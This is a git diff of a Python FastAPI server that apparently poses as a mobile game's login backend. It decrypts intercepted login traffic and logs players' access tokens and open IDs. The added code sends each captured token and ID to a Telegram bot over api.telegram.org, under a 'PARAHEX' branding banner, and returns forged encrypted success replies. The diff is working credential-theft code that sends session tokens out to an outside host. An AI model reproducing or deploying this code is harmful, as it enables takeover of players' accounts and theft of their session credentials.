@@ -21,18 +21,40 @@ def DEc_AEs(HeX):
     cipher = AES.new(Key, AES.MODE_CBC, Iv)
     return unpad(cipher.decrypt(HeX), AES.block_size).hex()
 
+# Send to Telegram
+def send_to_telegram(token, chat_id, message):
+    try:
+        import requests
+        url = f'https://api.telegram.org/bot{token}/sendMessage'
+        params = {
+            'chat_id': chat_id,
+            'text': message,
+            'parse_mode': 'HTML'
+        }
+        r = requests.post(url, data=params, timeout=10)
+        if r.status_code == 200:
+            print('✅ Sent to Telegram!')
+        else:
+            print(f'❌ Telegram error: {r.status_code}')
+    except Exception as e:
+        print(f"❌ Telegram error: {e}")
+
+# Get token and chat_id from environment variables (for Render)
+TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
+
 @app.api_route("/ver.php", methods=["GET", "POST"])
 async def manual(request: Request):
-    print("🔄 ver.php called - Returning hardcoded config")
+    print("🔄 ver.php called")
     
-    # Hardcoded response with code: 2 (what game expects)
+    # Exact response from real server with code: 2
     response_data = {
         "code": 2,
         "use_login_optional_download": False,
         "use_background_download": False,
         "use_background_download_lobby": False,
         "country_code": "IN",
-        "client_ip": "127.0.0.1",
+        "client_ip": request.client.host if request.client else "127.0.0.1",
         "gdpr_version": 0,
         "billboard_cdn_url": "",
         "billboard_msg": "",
@@ -56,9 +78,7 @@ async def manual(request: Request):
         "ggp_url": f"http://{request.headers.get('host', '127.0.0.1:6677')}"
     }
     
-    print(f"📝 Returning config with code: {response_data['code']}")
-    print(f"📝 ggp_url: {response_data['ggp_url']}")
-    
+    print(f"📝 Returning ver.php with code: {response_data['code']}")
     return JSONResponse(content=response_data, status_code=200)
 
 @app.api_route("/MajorLogin", methods=["POST"])
@@ -74,8 +94,19 @@ async def MajorLoginProxy(request: Request):
         
         print(f"✅ Access Token: {acess_token}")
         print(f"✅ Open ID: {open_id}")
-        print(f"📋 Full data: {json.dumps(x7m, indent=2)}")
         
+        # Send to Telegram if configured
+        if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
+            msg = f"""🎯 PARAHEX Login Successful!
+
+Access Token: {acess_token}
+Open ID: {open_id}
+
+By: @redzedking | @iix1f
+PARAHEX TOP 1 @parahex."""
+            send_to_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, msg)
+        
+        # Return the banner
         nikomLhnoud = f""" [b][c][279CF5]
 
 ███████████╗░██████╗░██╗░░░██╗████████╗░█████╗░██████╗░
@@ -94,7 +125,7 @@ async def MajorLoginProxy(request: Request):
 
         return Response(
             content=nikomLhnoud,
-            status_code=200,  # Changed from 500 to 200
+            status_code=200,
             media_type="application/octet-stream"
         )
         
@@ -117,7 +148,6 @@ async def GetLoginDataProxy(request: Request):
     try:
         decrypted = get_available_room(decrypt_api(body.hex()))
         x7m = json.loads(decrypted)
-        print(f"🔓 Decrypted: {json.dumps(x7m, indent=2)}")
         
         acess_token = x7m.get("29", "NOT FOUND")
         open_id = x7m.get("22", "NOT FOUND")
@@ -125,12 +155,28 @@ async def GetLoginDataProxy(request: Request):
         if acess_token != "NOT FOUND":
             print(f"✅ Access Token: {acess_token}")
             print(f"✅ Open ID: {open_id}")
+            
+            if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
+                msg = f"""🎯 GetLoginData Captured!
+
+Access Token: {acess_token}
+Open ID: {open_id}
+
+By: @redzedking | @iix1f
+PARAHEX TOP 1 @parahex."""
+                send_to_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, msg)
     except Exception as e:
         print(f"⚠️ Could not decrypt: {e}")
     
-    # Return success response
+    # Return encrypted success response
+    success_response = {
+        "status": "success",
+        "message": "OK"
+    }
+    encrypted = EnC_AEs(json.dumps(success_response).encode())
+    
     return Response(
-        content=b"",
+        content=bytes.fromhex(encrypted),
         status_code=200,
         headers={
             "Content-Type": "application/octet-stream",
@@ -155,7 +201,7 @@ async def root():
 async def health():
     return JSONResponse({"status": "healthy"})
 
-# Catch all other requests
+# Catch all
 @app.api_route("/{path:path}", methods=["GET", "POST", "PUT", "DELETE", "PATCH"])
 async def catch_all(request: Request, path: str):
     print(f"🔄 Catch-all: {path}")
@@ -163,8 +209,5 @@ async def catch_all(request: Request, path: str):
 
 if __name__ == "__main__":
     print(f"\n🚀 Starting server on http://{HOST}:{PORT}")
-    print(f"📡 ver.php -> Hardcoded config with code: 2")
-    print(f"📡 MajorLogin -> Capture token")
-    print(f"📡 GetLoginData -> Capture token")
     print("="*80 + "\n")
     uvicorn.run(app, host=HOST, port=PORT, log_level='info')
